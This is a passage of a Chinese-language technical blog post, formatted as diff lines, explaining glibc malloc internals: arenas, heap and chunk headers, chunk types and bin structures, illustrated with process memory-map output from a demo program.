+<p>在主线程malloc之后：<br>在下面的输出中，我们可以看到堆段被创建了，并且正好在数据段0804b000-0806c000之上，这表明堆内存是通过增加程序break位置创建的(比如使<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L2458" target="_blank" rel="external">brk系统调用</a>)。此外，请注意，尽管用户只申请了1000字节的内存，但是实际产生了<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L2429" target="_blank" rel="external">132KB的</a>堆内存，这个连续的堆内存区域被称为arena，因为这个arena是由主线程创建的，所以被称为<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1740" target="_blank" rel="external">main arena</a>，接下来的申请会继续使用这个arena的空闲空间，直到用尽。<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L3788" target="_blank" rel="external">当用尽的时候</a>，可以通过增加程序break位置来创建，在<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L2521" target="_blank" rel="external">扩容</a>之后，top chunk的大小也随之调整以圈进这块额外的空间。相应地，arena也可以在top chunk空间过大时<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L4044" target="_blank" rel="external">缩小</a>。</p>
+<p><u>注意</u>：top chunk是一个arena中最顶层的chunk。有关top chunk的更多信息见下述“top chunk”部分</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread </div><div class="line">Welcome to per thread arena example::<span class="number">6501</span></div><div class="line">Before <span class="built_in">malloc</span> in main thread</div><div class="line">After <span class="built_in">malloc</span> and before <span class="built_in">free</span> in main thread</div><div class="line">...</div><div class="line">sploitfun@sploitfun-VirtualBox:~/lsploits/hof/ptmalloc.ppt/mthread$ cat /proc/<span class="number">6501</span>/maps</div><div class="line"><span class="number">08048000</span><span class="number">-08049000</span> r-xp <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread</div><div class="line"><span class="number">08049000</span><span class="number">-0804</span>a000 r--p <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread</div><div class="line"><span class="number">0804</span>a000<span class="number">-0804</span>b000 rw-p <span class="number">00001000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread</div><div class="line"><span class="number">0804b</span>000<span class="number">-0806</span>c000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span>          [heap]</div><div class="line">b7e05000-b7e07000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span> </div><div class="line">...</div><div class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$</div></pre></td></tr></table></figure>
+<p>在主线程free之后：<br>在如下的输出中我们可以看到，当分配的内存被free掉的时候，其后的内存并不会立即释放给操作系统。分配的内存区域（1000B）仅仅只是<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L4017" target="_blank" rel="external">释放</a>给了‘glibc malloc’库，它把这段free掉的区域添加在了main arena bin中。随后当用户请求内存时，‘glibc malloc’就不再从内核中申请新的堆区了，而是尝试在bin中<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L3376" target="_blank" rel="external">找到</a>空闲区块，除非实在找不到。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread </div><div class="line">Welcome to per thread arena example::<span class="number">6501</span></div><div class="line">Before <span class="built_in">malloc</span> in main thread</div><div class="line">After <span class="built_in">malloc</span> and before <span class="built_in">free</span> in main thread</div><div class="line">After <span class="built_in">free</span> in main thread</div><div class="line">...</div><div class="line">sploitfun@sploitfun-VirtualBox:~/lsploits/hof/ptmalloc.ppt/mthread$ cat /proc/<span class="number">6501</span>/maps</div><div class="line"><span class="number">08048000</span><span class="number">-08049000</span> r-xp <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread</div><div class="line"><span class="number">08049000</span><span class="number">-0804</span>a000 r--p <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread</div><div class="line"><span class="number">0804</span>a000<span class="number">-0804</span>b000 rw-p <span class="number">00001000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread</div><div class="line"><span class="number">0804b</span>000<span class="number">-0806</span>c000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span>          [heap]</div><div class="line">b7e05000-b7e07000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span> </div><div class="line">...</div><div class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$</div></pre></td></tr></table></figure>
+<p>在thread1 malloc之前：<br>在如下的输出中我们可以看到此时并没有thread1的堆段，但是thread1的每个线程栈已经创建。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread </div><div class="line">Welcome to per thread arena example::<span class="number">6501</span></div><div class="line">Before <span class="built_in">malloc</span> in main thread</div><div class="line">After <span class="built_in">malloc</span> and before <span class="built_in">free</span> in main thread</div><div class="line">After <span class="built_in">free</span> in main thread</div><div class="line">Before <span class="built_in">malloc</span> in thread <span class="number">1</span></div><div class="line">...</div><div class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/<span class="number">6501</span>/maps</div><div class="line"><span class="number">08048000</span><span class="number">-08049000</span> r-xp <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread</div><div class="line"><span class="number">08049000</span><span class="number">-0804</span>a000 r--p <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread</div><div class="line"><span class="number">0804</span>a000<span class="number">-0804</span>b000 rw-p <span class="number">00001000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread</div><div class="line"><span class="number">0804b</span>000<span class="number">-0806</span>c000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span>          [heap]</div><div class="line">b7604000-b7605000 ---p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span> </div><div class="line">b7605000-b7e07000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span>          [<span class="built_in">stack</span>:<span class="number">6594</span>]</div><div class="line">...</div><div class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$</div></pre></td></tr></table></figure>
+<p>在thread1 malloc之后：<br>在如下的输出结果中我们可以看到thread1的堆段已经被创建了，并且被建立在内存映射段区域（b75000000-b7521000,132KB），这也表明堆内存是使用<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/arena.c#L546https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/arena.c#L546" target="_blank" rel="external">mmap</a>调用产生的，不像主线程使用sbrk调用产生的。同样的，尽管用户只申请了1000字节，1MB的堆内存空间还是被映射到了进程地址空间，在这<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/arena.c#L546" target="_blank" rel="external">1MB</a>的中，只有<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/arena.c#L573" target="_blank" rel="external">132KB</a>被设置了读写权限并成为该线程的堆内存，这段连续的内存区域（132KB）被称为<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/arena.c#L736" target="_blank" rel="external">thread arena</a>。</p>
+<p><u>注意</u>：当用户请求内存大小超过128KB并且此时arena中没有足够的空间来满足用户的请求时，不论请求是来自main thread还是thread arena，都将通过mmap系统调用来分配内存。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">ploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread </div><div class="line">Welcome to per thread arena example::<span class="number">6501</span></div><div class="line">Before <span class="built_in">malloc</span> in main thread</div><div class="line">After <span class="built_in">malloc</span> and before <span class="built_in">free</span> in main thread</div><div class="line">After <span class="built_in">free</span> in main thread</div><div class="line">Before <span class="built_in">malloc</span> in thread <span class="number">1</span></div><div class="line">After <span class="built_in">malloc</span> and before <span class="built_in">free</span> in thread <span class="number">1</span></div><div class="line">...</div><div class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/<span class="number">6501</span>/maps</div><div class="line"><span class="number">08048000</span><span class="number">-08049000</span> r-xp <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread</div><div class="line"><span class="number">08049000</span><span class="number">-0804</span>a000 r--p <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread</div><div class="line"><span class="number">0804</span>a000<span class="number">-0804</span>b000 rw-p <span class="number">00001000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread</div><div class="line"><span class="number">0804b</span>000<span class="number">-0806</span>c000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span>          [heap]</div><div class="line">b7500000-b7521000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span> </div><div class="line">b7521000-b7600000 ---p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span> </div><div class="line">b7604000-b7605000 ---p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span> </div><div class="line">b7605000-b7e07000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span>          [<span class="built_in">stack</span>:<span class="number">6594</span>]</div><div class="line">...</div><div class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$</div></pre></td></tr></table></figure>
+<p>在thread1 free之后：<br>在如下的输出中我们可以看到在free掉分配了的内存区域的时候并不会把堆内存直接归还给操作系统，而是仅仅<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L4017" target="_blank" rel="external">释放</a>给了‘glibc malloc’，然后把它添加在thread arena bin中。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread </div><div class="line">Welcome to per thread arena example::<span class="number">6501</span></div><div class="line">Before <span class="built_in">malloc</span> in main thread</div><div class="line">After <span class="built_in">malloc</span> and before <span class="built_in">free</span> in main thread</div><div class="line">After <span class="built_in">free</span> in main thread</div><div class="line">Before <span class="built_in">malloc</span> in thread <span class="number">1</span></div><div class="line">After <span class="built_in">malloc</span> and before <span class="built_in">free</span> in thread <span class="number">1</span></div><div class="line">After <span class="built_in">free</span> in thread <span class="number">1</span></div><div class="line">...</div><div class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/<span class="number">6501</span>/maps</div><div class="line"><span class="number">08048000</span><span class="number">-08049000</span> r-xp <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread</div><div class="line"><span class="number">08049000</span><span class="number">-0804</span>a000 r--p <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread</div><div class="line"><span class="number">0804</span>a000<span class="number">-0804</span>b000 rw-p <span class="number">00001000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">539625</span>     /home/sploitfun/ptmalloc.ppt/mthread/mthread</div><div class="line"><span class="number">0804b</span>000<span class="number">-0806</span>c000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span>          [heap]</div><div class="line">b7500000-b7521000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span> </div><div class="line">b7521000-b7600000 ---p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span> </div><div class="line">b7604000-b7605000 ---p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span> </div><div class="line">b7605000-b7e07000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span>          [<span class="built_in">stack</span>:<span class="number">6594</span>]</div><div class="line">...</div><div class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$</div></pre></td></tr></table></figure>
+<h3 id="0X02-Arena"><a href="#0X02-Arena" class="headerlink" title="0X02 Arena"></a>0X02 Arena</h3><p><u>Arena的数量</u>：<br>在以上的这些例子中，我们可以看到主线程包含main arena而thread1包含它自有的thread arena。所以在不计线程的数量的时候，在线程和arena之间是否存在一对一的映射关系？当然不存在，部分极端的应用甚至运行比处理器核心的数量还多的线程，在这种情况下，每个线程都拥有一个arena开销过高且意义不大。因此，<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/arena.c#L847" target="_blank" rel="external">应用的Arena数量限制是基于系统的核心数的</a>。</p>
+<pre><code>For 32 bit systems:
+    Number of arena = 2 * number of cores + 1.
+For 64 bit systems:
+    Number of arena = 8 * number of cores + 1.
+Multiple Arena：
+</code></pre><p><u>举例</u>: 让我们来看一个运行在单核且操作系统为32位的计算机上的多线程应用（4线程=1个主线程+3个用户线程）的例子，这里线程的数量（4）&gt;内核数量的2倍（2），因此在这种情况下，‘glibc malloc’认定multiple arenas 被所有可用线程共享，但是它是如何共享的呢？</p>
+<ul>
+<li>当主线程第一次调用malloc时，<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1740" target="_blank" rel="external">已经建立的main arena</a>会被无竞争的使用</li>
+<li>当线程1和线程2第一调用malloc时，<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/arena.c#L870" target="_blank" rel="external">一块新的arena会被建立</a>并被没有竞争的使用，此时线程和arena之间有着一对一的映射关系</li>
+<li>当线程3第一次调用malloc时，arena的限制数量会被<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/arena.c#L847" target="_blank" rel="external">计算</a>出来，这里超过了arena的数量限制，所以就会尝试复用已经存在的arena（main arena，arena1或者arena2）</li>
+<li>复用:<ul>
+<li><a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/arena.c#L810" target="_blank" rel="external">一旦遍历出</a>可用arena，就开始自旋申请该arena的锁。</li>
+<li>如果上锁成功（比如说main arena上锁成功），就将该arena<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/arena.c#L826" target="_blank" rel="external">返回给用户</a>。</li>
+<li>如果查无可用arena，thread 3的malloc操作<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/arena.c#L819" target="_blank" rel="external">阻塞</a>，直到有可用的arena为止。</li>
+</ul>
+</li>
+<li>当thread 3第二次调用malloc时，malloc会<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L2884" target="_blank" rel="external">尝试使用上一次使用的arena（main arena）</a>。当main arena可用时就用，否则thread 3就一直阻塞直至main arena被free掉。因此现在main arena实际上是被main thread和thread 3所共享。</li>
+</ul>
+<h3 id="0X03-多个堆"><a href="#0X03-多个堆" class="headerlink" title="0X03 多个堆"></a>0X03 多个堆</h3><p>在‘glibc malloc’源码中主要发现了以下三种数据结构：</p>
+<p><a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/arena.c#L59" target="_blank" rel="external">Heap_info</a>—Heap Header – 一个thread arena可以有多个堆，每个堆都有它自己的堆头，为什么需要多个堆？一开始每个thread arena都只有一个堆，但是当这个堆段空间被耗尽时，新的堆(非连续区域)就会被mmap到这个arena。</p>
+<p><a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1671" target="_blank" rel="external">Malloc_state</a> – Arena Header—-一个线程可以有多个堆，但是这所有的堆都只有一个arena header。Arena header包含一些关于bins，top chunk和last remainder chunk等等的信息。</p>
+<p><a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1108" target="_blank" rel="external">Malloc_chunk</a>–chunk header–一个堆根据用户请求被划分为多个chunks。每个chunks都有它自己的chunk header。</p>
+<p><u>注意</u>：<br>Main arena没有多个堆，因此也没有heap_info这个数据结构，当main arena耗尽空间时，就拓展sbrk’d堆段（连续区域）直至碰到内存mapping区域为止<br>不像thread arena一样，mainarena的arena header并不是sbrk’d堆段的一部分，它是一个<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1740" target="_blank" rel="external">全局变量</a>，因此它可以在libc.so的数据段中被找到。<br>main arena和thread arena的图示如下（单堆段）：</p>
+<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/glibcmalloc1.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/glibcmalloc1.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
+
+<p>thread arena的图示如下（多堆段）：</p>
+<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/glibcmalloc2.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/glibcmalloc2.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
+
+<h3 id="0X04-Chunk"><a href="#0X04-Chunk" class="headerlink" title="0X04 Chunk"></a>0X04 Chunk</h3><p>堆段中能找到的chunk类型如下：</p>
+<ul>
+<li>Allocated chunk</li>
+<li>Free chunk</li>
+<li>Top chunk</li>
+<li>Last Remainder chunk</li>
+<li>Allocated chunk：</li>
+</ul>
+<p><u>已分配的chunk</u></p>
+<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/glibcmalloc3.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/glibcmalloc3.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
+
+<p><a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1110" target="_blank" rel="external">prev_size</a>：若上一个chunk可用，则此结构成员赋值为上一个chunk的大小；否则若上一个chunk被分配，此结构成员赋值为上一个chunk的用户数据大小。<br><a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1111" target="_blank" rel="external">size</a>：此结构成员赋值为已分配chunk大小，其最后三位包含标志(flag)信息。</p>
+<ul>
+<li><a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1267" target="_blank" rel="external">PREV_INUSE (P)</a> – 置“1”表示上一个chunk被分配；</li>
+<li><a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1274" target="_blank" rel="external">IS_MMAPPED (M)</a> – 置“1”表示这一个chunk被nmap’d；</li>
+<li><a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1283" target="_blank" rel="external">NON_MAIN_ARENA (N)</a> – 置“1”表示这一个chunk属于一个thread arena。</li>
+</ul>
+<p><u>注意</u>：<br>malloc_chunk 中的其余结构成员，如fd、 bk不用于已分配的chunk，因此它们被拿来存储用户数据；<br>用户请求的大小被<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1254" target="_blank" rel="external">转换</a>为可用大小（内部显示大小），因为需要一些额外的空间存储malloc_chunk，此外还需要考虑对齐的因素，它经常是以这样一种方式进行转换，可用大小的最后三位不设置值，用于存储标志信息。</p>
+<p><u>空闲chunk</u>：</p>
+<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/glibcmalloc4.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/glibcmalloc4.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
+
+<p><a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1110" target="_blank" rel="external">prev_size</a>：两个空闲的chunks不能毗连，当有两个chunks都空闲的时候，他们会合并成一个空闲的chunk，因此前一个chunk和这一个空闲chunk都会被分配，此时prev_size中保存上一个chunk的用户数据。<br><a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1111" target="_blank" rel="external">size</a>：该结构成员保存本空闲chunk的大小。<br><a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1113" target="_blank" rel="external">fd</a>：Forward pointer - 指向同一bin中的下一个chunk（而非物理内存中下一块）。<br><a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1114" target="_blank" rel="external">bk</a>：Backward pointer – 指向同一bin中的上一个chunk（而非物理内存中上一块）。</p>
+<h3 id="0X05-Bins"><a href="#0X05-Bins" class="headerlink" title="0X05 Bins"></a>0X05 Bins</h3><p>Bins就是空闲列表数据结构。它们用以保存空闲chunk。基于chunk的大小，可分为下列几种bins：</p>
+<ul>
+<li>Fast bin</li>
+<li>Unsorted bin</li>
+<li>Small bin</li>
+<li>Large bin</li>
+</ul>
+<p><a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1680" target="_blank" rel="external">fastbinsY</a>：这个数组用以保存fast bins。<br><a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1689" target="_blank" rel="external">bins</a>：这个数组用以保存unsorted、small以及large bins，共计126个：</p>
+<ul>
+<li>Bin 1 – unsorted bin</li>
+<li>Bin 2 to Bin 63 – small bin</li>
+<li>Bin 64 to Bin 126 – large bin</li>
+</ul>
+<p><u>Fast Bin</u>：<br>大小为<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1249" target="_blank" rel="external">16字节</a>到<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1600" target="_blank" rel="external">80字节</a>的chunk被称为fast chunk，用于保存fast chunk的bins被称为fast bins，在所有的bins中，fast bins分配内存和释放内存的速度都相对较快。</p>
+<ul>
+<li>bins的数量 - <a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1680" target="_blank" rel="external">10</a> <ul>
+<li>每个fast bin都包含一条free chunk的单链表（称为binlist） ，采用单链表是出于fast bin中chunk不会被从链表的中间移除的特点，增删chunk都发生在链表的前端。 -LIFO</li>
+</ul>
+</li>
+<li>chunk大小 - <a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1595" target="_blank" rel="external">8字节递增</a> <ul>
+<li>fast bins 包含着大小以8字节递增的bin链表。也即，fast bin(index 0)包含着大小为16字节的chunk的binlist、fast bin(index 1)包含着大小为24字节的chunk的binlist 依次类推……</li>
+<li>指定fast bin中所有chunk大小均相同。</li>
+</ul>
+</li>
+<li>在<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1778" target="_blank" rel="external">malloc初始化过程中</a>，最大的fast bin的大小被<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1795" target="_blank" rel="external">设置</a>为64而非80字节。因此默认情况下大小16~64字节的chunk被分类为fast chunk。</li>
+<li>不能合并 - 两个毗连的空闲chunk并不会被合并成一个空闲chunk。不合并可能会导致碎片化问题，但是却可以大大加速释放的过程！</li>
+<li>malloc(fast chunk) <ul>
+<li>初始情况下fast bin<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1765" target="_blank" rel="external">最大内存容量</a>以及<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1680" target="_blank" rel="external">指针域</a>均未初始化，因此即使用户请求fast chunk，服务的也将是<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L3330" target="_blank" rel="external">small bin code</a>而非fast bin code。</li>
+<li>当它非空后，fast bin索引将被<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L3332" target="_blank" rel="external">计算</a>以检索对应的binlist。</li>
+<li>binlist中被检索的第一个chunk将被摘除并返回给用户。</li>
+</ul>
+</li>
+<li>free(fast chunk) <ul>
+<li>fast bin索引被计算以索引相应binlist。</li>
+<li>free掉的chunk将被添加在索引到的binlist的前端。</li>
+</ul>
+</li>
+</ul>
+<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/glibcmalloc5.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/glibcmalloc5.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
+
+
+<p><u>Unsorted Bin</u>：<br>当小的或者是大的chunk被释放了，它们并不会被添加到它们各自的bins里面，而会被添加到unsorted bin中，这种方式就给予了‘glibc malloc’第二次机会去复用最近被free的chunks，这样寻找合适bin的时间开销就被抹掉了，因此内存分配和释放都会变得快一点。</p>
+<ul>
+<li>数量—1<br>unsorted bin包括一个用于保存空闲chunk的双向循环链表（又名binlist）。</li>
+<li>大小—没有大小限制，任何大小的chunk都可以添加进这个bin</li>
+</ul>
+<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/glibcmalloc6.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/glibcmalloc6.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
+
+
+<p><u>Small Bin</u>：<br>小于512字节的chunk被称为small chunk，保存了small chunk的bins被称为small bins。Small bins的内存分配和释放速度都比large bins快（但是比fast bins慢）</p>
+<ul>
+<li>数量—62<ul>
+<li>每个small bin都包含一个用于保存空闲chunk的双向循环链表，之所以用双向链表是由于在small bin中chunk不能直接从链表的中间位置链接到，free掉的chunk从链表的尾端移除，增加的chunk从链表的链表的前端插入</li>
+</ul>
+</li>
+<li>大小—8字节递增<ul>
+<li>samll bins 记录着大小以8字节递增的bin链表。也即，第一个small bin(Bin 2)记录着大小为16字节的chunk的binlist、small bin(Bin 3)记录着大小为24字节的chunk的binlist 依次类推……</li>
+<li>指定samll bin中所有chunk大小均相同，因此无需排序。</li>
+</ul>
+</li>
+<li>合并 - 两个毗连的空闲chunk会被合并成一个空闲chunk。合并消除了碎片化的影响但是减慢了free的速度。</li>
+<li>malloc（small chunk） <ul>
+<li>初始情况下，small bin都会是NULL，因此尽管用户请求small chunk，提供服务的将是 unsorted bin code 而不是 small bin code。</li>
+<li>同样地，在第一次调用malloc期间，在malloc_state找到的samll bin和large bin数据结构被初始化，bin都会指向它们本身以表示binlist为空。</li>
+<li>此后当samll bin非空后，相应的bin会摘除binlist中最后一个chunk并返回给用户。</li>
+</ul>
+</li>
+<li>free（small chunk） <ul>
+<li>在free一个chunk的时候，检查其前或其后的chunk是否空闲，若是则合并，也即把它们从所属的链表中摘除并合并成一个新的chunk，新chunk会添加在unsorted bin链表的前端。</li>
+</ul>
+</li>
+</ul>
+<p><u>Large Bin</u>：<br>大小大于等于512字节的chunk被称为large chunk，保存large chunk的bins被称为large bins，large bins的内存分配和释放速度都比small bins的慢。</p>
+<ul>
+<li>数量—63<ul>
+<li>每个large bin都包括一个空闲chunk的双向循环链表（也称binlist）。free掉的chunk添加在链表的前端，而所需chunk则从链表后端摘除。-FIFO</li>
+<li>超过63个bin之后 <ul>
+<li>前32个bin记录着大小以64字节递增的bin链表，也即第一个large bin(Bin 65)记录着大小为512字节~568字节的chunk的binlist、第二个large bin(Bin 66)记录着大小为576字节到632字节的chunk的binlist，依次类推……</li>
+<li>后16个bin记录着大小以512字节递增的bin链表。</li>
+<li>后8个bin记录着大小以4096字节递增的bin链表。<br>-后4个bin记录着大小以32768字节递增的bin链表。<br>-后2个bin记录着大小以262144字节递增的bin链表。<br>-最后1个bin记录着大小为剩余大小的chunk。</li>
+</ul>
+</li>
